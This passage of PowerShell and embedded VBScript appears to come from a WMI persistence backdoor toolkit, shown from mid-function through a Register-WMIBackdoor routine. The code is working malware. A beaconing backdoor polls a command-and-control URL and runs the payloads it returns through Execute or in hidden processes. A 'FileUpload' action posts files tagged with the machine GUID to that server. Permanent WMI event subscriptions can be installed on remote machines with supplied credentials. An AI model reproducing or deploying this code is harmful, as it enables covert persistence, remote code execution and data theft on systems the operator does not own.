&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Set oDataObject = oServices.Get<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; oDataObject.Path_.Class = classname<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; oDataObject.Properties_.Add(propertyname, 8).Value = ""<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; oDataObject.Delete_()<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; End Sub<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Sub ExecCommand(command)<br/>
&#09; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Dim oLocation, oServices, oProcess, oStartup, oConfig, oResult, iProcessID<br/>
<br/>
&#09; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Const HIDDEN_WINDOW = 12<br/>
&#09; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Set oLocation = CreateObject("WbemScripting.SWbemLocator")<br/>
&#09; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Set oServices = oLocation.ConnectServer(, "root\cimv2")<br/>
&#09; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Set oStartup = oServices.Get("Win32_ProcessStartup")<br/>
&#09; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Set oConfig = oStartup.SpawnInstance_<br/>
&#09; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;oConfig.ShowWindow = HIDDEN_WINDOW<br/>
&#09; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Set oProcess = GetObject("winmgmts:root\cimv2:Win32_Process")<br/>
&#09; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;oResult = oProcess.Create(command, null, oConfig, iProcessID)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; End Sub<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $Base64Decoder<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Set oXMLHTTP = CreateObject("MSXML2.XMLHTTP")<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; oXMLHTTP.open "GET", aC2URL, False<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; oXMLHTTP.send()<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; If oXMLHTTP.Status = 200 Then<br/>
&#09; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;aCmdType = oXMLHTTP.getResponseHeader("Type")<br/>
&#09; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;aClassName = oXMLHTTP.getResponseHeader("Class")<br/>
&#09; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;aPropertyName = oXMLHTTP.getResponseHeader("Property")<br/>
&#09; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;aPayload = Base64Decode(oXMLHTTP.responseText)<br/>
&#09;<br/>
&#09; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Select Case aCmdType<br/>
&#09;&#09; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Case "V"<br/>
&#09;&#09;&#09; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;If Not IsNull(aPayload) Then<br/>
&#09;&#09;&#09;&#09; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Execute aPayload<br/>
&#09;&#09;&#09; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;End If<br/>
&#09;&#09; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Case "P"<br/>
&#09;&#09;&#09; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;If Not IsNull(aClassName) And Not IsNull(aPropertyName) And Not IsNull(aPayload) Then<br/>
&#09;&#09;&#09;&#09; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Call StorePayloadInWMIRepo(aClassName, aPropertyName, aPayload)<br/>
&#09;&#09;&#09; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;End If<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Case "D"<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; If Not IsNull(aClassName) And Not IsNull(aPropertyName) Then<br/>
&#09;&#09;&#09;&#09; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Call DeleteWMIClass(aClassName, aPropertyName)<br/>
&#09;&#09;&#09; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;End If<br/>
&#09;&#09; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Case "C"<br/>
&#09;&#09;&#09; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;If Not IsNull(aPayload) Then<br/>
&#09;&#09;&#09;&#09; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Call ExecCommand(aPayload)<br/>
&#09;&#09;&#09; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;End If<br/>
&#09; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;End Select<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; End If<br/>
<br/>
"@<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if ($ActionName) {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $Name = $ActionName<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; } else {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $Name = 'LaunchBeaconingBackdoor'<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<br/>
&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; 'KillProcess' {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $VBScript = @"<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Dim oLocation, oServices, oProcessList, oProcess<br/>
<br/>
&#09; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Set oLocation = CreateObject("WbemScripting.SWbemLocator")<br/>
&#09; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Set oServices = oLocation.ConnectServer(, "root\cimv2")<br/>
&#09; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Set oProcessList = oServices.ExecQuery("SELECT * FROM Win32_Process WHERE ProcessID = " &amp; TargetEvent.ProcessID)<br/>
&#09; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;For Each oProcess in oProcessList<br/>
&#09;&#09; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;oProcess.Terminate()<br/>
&#09; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Next<br/>
"@<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if ($ActionName) {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $Name = $ActionName<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; } else {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $Name = 'KillProcess'<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<br/>
&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; 'InfectDrive' {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; # This is only a PoC at this stage. This payload simply drops<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; # the EICAR signature to &lt;INSERTED_DRIVE_LETTER&gt;:\eicar.txt<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $VBScript = @"<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Dim oFSO, oFile, sFilePath, sDecodedEicar<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $Base64Decoder<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; sDecodedEicar = Base64Decode("WDVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLVNUQU5EQVJELUFOVElWSVJVUy1URVNULUZJTEUhJEgrSCo=")<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Set oFSO = CreateObject("Scripting.FileSystemObject")<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; sFilePath = TargetEvent.DriveName &amp; "\eicar.txt"<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Set oFile = oFSO.CreateTextFile(sFilePath, True)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; oFile.Write sDecodedEicar<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; oFile.Close<br/>
"@<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if ($ActionName) {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $Name = $ActionName<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; } else {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $Name = 'DriveInfector'<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<br/>
&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; 'FileUpload' {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $VBScript = @"<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; On Error Resume Next<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Dim oReg, oXMLHTTP, oStream, aMachineGuid, aC2URL, vBinary<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Set oReg = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv")<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; oReg.GetStringValue &amp;H80000002, "SOFTWARE\Microsoft\Cryptography", "MachineGuid", aMachineGuid<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; aC2URL = "$($C2Uri.AbsoluteUri)index.html&amp;ID=" &amp; aMachineGuid<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Set oStream = CreateObject("ADODB.Stream")<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; oStream.Type = 1<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; oStream.Open<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; oStream.LoadFromFile TargetEvent.TargetInstance.Name<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; vBinary = oStream.Read<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Set oXMLHTTP = CreateObject("MSXML2.XMLHTTP")<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; oXMLHTTP.open "POST", aC2URL, False<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; oXMLHTTP.setRequestHeader "Path", TargetEvent.TargetInstance.Name<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; oXMLHTTP.send(vBinary)<br/>
"@<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if ($ActionName) {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $Name = $ActionName<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; } else {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $Name = 'FileUpload'<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<br/>
&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
&nbsp; &nbsp; }<br/>
<br/>
&nbsp; &nbsp; $Action = @{<br/>
&nbsp; &nbsp; &nbsp; &nbsp; Name = $Name<br/>
&nbsp; &nbsp; &nbsp; &nbsp; ScriptingEngine = 'VBScript'<br/>
&nbsp; &nbsp; &nbsp; &nbsp; ScriptText = $VBScript<br/>
&nbsp; &nbsp; &nbsp; &nbsp; KillTimeout = [UInt32] 45<br/>
&nbsp; &nbsp; }<br/>
<br/>
&nbsp; &nbsp; $Action.PSObject.TypeNames.Insert(0, 'WMI.BackdoorAction')<br/>
&nbsp; &nbsp; return $Action<br/>
}<br/>
<br/>
Function Register-WMIBackdoor {<br/>
&nbsp; &nbsp; Param (<br/>
&nbsp; &nbsp; &nbsp; &nbsp; [Parameter(Mandatory = $True)]<br/>
&nbsp; &nbsp; &nbsp; &nbsp; [ValidateScript({$_.PSObject.TypeNames[0].StartsWith('WMI.BackdoorTrigger')})]<br/>
&nbsp; &nbsp; &nbsp; &nbsp; [Hashtable]<br/>
&nbsp; &nbsp; &nbsp; &nbsp; $Trigger,<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; [Parameter(Mandatory = $True)]<br/>
&nbsp; &nbsp; &nbsp; &nbsp; [ValidateScript({$_.PSObject.TypeNames[0] -eq 'WMI.BackdoorAction'})]<br/>
&nbsp; &nbsp; &nbsp; &nbsp; [Hashtable]<br/>
&nbsp; &nbsp; &nbsp; &nbsp; $Action,<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; [String]<br/>
&nbsp; &nbsp; &nbsp; &nbsp; [ValidateNotNullOrEmpty()]<br/>
&nbsp; &nbsp; &nbsp; &nbsp; [Alias('Cn')]<br/>
&nbsp; &nbsp; &nbsp; &nbsp; $ComputerName = '.',<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; [Management.Automation.PSCredential]<br/>
&nbsp; &nbsp; &nbsp; &nbsp; $Credential<br/>
&nbsp; &nbsp; )<br/>
<br/>
&nbsp; &nbsp; $TypeComponents = $Trigger.PSObject.TypeNames[0].Split('.')<br/>
&nbsp; &nbsp; <br/>
&nbsp; &nbsp; # Register the timer components if a time-based trigger was selected<br/>
&nbsp; &nbsp; switch ($TypeComponents[2]) {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; 'TimingInterval' {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $TimerName = $TypeComponents[3]<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $TimingInterval = $TypeComponents[4]<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $TimerArg = @{<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; IntervalBetweenEvents = ([UInt32] $TimingInterval)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; SkipIfPassed = $False<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; TimerId = $TimerName<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $Arguments = @{<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Namespace = 'ROOT\cimv2'<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Class = '__IntervalTimerInstruction'<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ComputerName = $ComputerName<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Arguments = $TimerArg<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ErrorAction = 'Stop'<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if ($PSBoundParameters['Credential']) { $Arguments['Credential'] = $PSBoundParameters['Credential'] }<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $Timer = Set-WmiInstance @Arguments<br/>
&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; 'DateTime' {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $TimerName = $TypeComponents[3]<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $DateTime = $TypeComponents[3].Replace('_', '.')<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $TimerArg = @{<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; EventDateTime = $DateTime<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; SkipIfPassed = $False<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; TimerId = $TimerName<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $Arguments = @{<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Namespace = 'ROOT\cimv2'<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Class = '__AbsoluteTimerInstruction'<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ComputerName = $ComputerName<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Arguments = $TimerArg<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ErrorAction = 'Stop'<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if ($PSBoundParameters['Credential']) { $Arguments['Credential'] = $PSBoundParameters['Credential'] }<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $Timer = Set-WmiInstance @Arguments<br/>
&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
&nbsp; &nbsp; }<br/>
<br/>
&nbsp; &nbsp; $FilterParams = @{<br/>
&nbsp; &nbsp; &nbsp; &nbsp; Namespace = 'root\subscription'<br/>
&nbsp; &nbsp; &nbsp; &nbsp; Class = '__EventFilter'<br/>
&nbsp; &nbsp; &nbsp; &nbsp; ComputerName = $ComputerName<br/>
&nbsp; &nbsp; &nbsp; &nbsp; Arguments = $Trigger<br/>
&nbsp; &nbsp; &nbsp; &nbsp; ErrorAction = 'Stop'<br/>
&nbsp; &nbsp; }<br/>
<br/>
&nbsp; &nbsp; if ($PSBoundParameters['Credential']) { $FilterParams['Credential'] = $PSBoundParameters['Credential'] }<br/>
<br/>
&nbsp; &nbsp; $Filter = Set-WmiInstance @FilterParams<br/>
<br/>
&nbsp; &nbsp; $ConsumerParams = @{<br/>
&nbsp; &nbsp; &nbsp; &nbsp; Namespace = 'root\subscription'<br/>
&nbsp; &nbsp; &nbsp; &nbsp; Class = 'ActiveScriptEventConsumer'<br/>
&nbsp; &nbsp; &nbsp; &nbsp; ComputerName = $ComputerName<br/>
&nbsp; &nbsp; &nbsp; &nbsp; Arguments = $Action<br/>
&nbsp; &nbsp; &nbsp; &nbsp; ErrorAction = 'Stop'<br/>
&nbsp; &nbsp; }<br/>
<br/>
&nbsp; &nbsp; if ($PSBoundParameters['Credential']) { $ConsumerParams['Credential'] = $PSBoundParameters['Credential'] }<br/>
<br/>
&nbsp; &nbsp; $Consumer = Set-WmiInstance @ConsumerParams<br/>
<br/>
&nbsp; &nbsp; $BindingParams = @{<br/>
&nbsp; &nbsp; &nbsp; &nbsp; Namespace = 'root\subscription'<br/>
&nbsp; &nbsp; &nbsp; &nbsp; Class = '__FilterToConsumerBinding'<br/>
&nbsp; &nbsp; &nbsp; &nbsp; ComputerName = $ComputerName<br/>
&nbsp; &nbsp; &nbsp; &nbsp; Arguments = @{ Filter = $Filter; Consumer = $Consumer }<br/>
&nbsp; &nbsp; &nbsp; &nbsp; ErrorAction = 'Stop'<br/>
&nbsp; &nbsp; }<br/>
<br/>
&nbsp; &nbsp; if ($PSBoundParameters['Credential']) { $BindingParams['Credential'] = $PSBoundParameters['Credential'] }<br/>
<br/>
&nbsp; &nbsp; $FilterConsumerBinding = Set-WmiInstance @BindingParams<br/>
<br/>
&nbsp; &nbsp; $Result = New-Object PSObject -Property @{<br/>
&nbsp; &nbsp; &nbsp; &nbsp; Filter = $Filter<br/>
&nbsp; &nbsp; &nbsp; &nbsp; Consumer = $Consumer<br/>
&nbsp; &nbsp; &nbsp; &nbsp; Binding = $FilterConsumerBinding<br/>
&nbsp; &nbsp; }<br/>
<br/>
&nbsp; &nbsp; $Result.PSObject.TypeNames.Insert(0, 'WMI.BackdoorRegistration')<br/>
&nbsp; &nbsp; return $Result<br/>
}</body></html>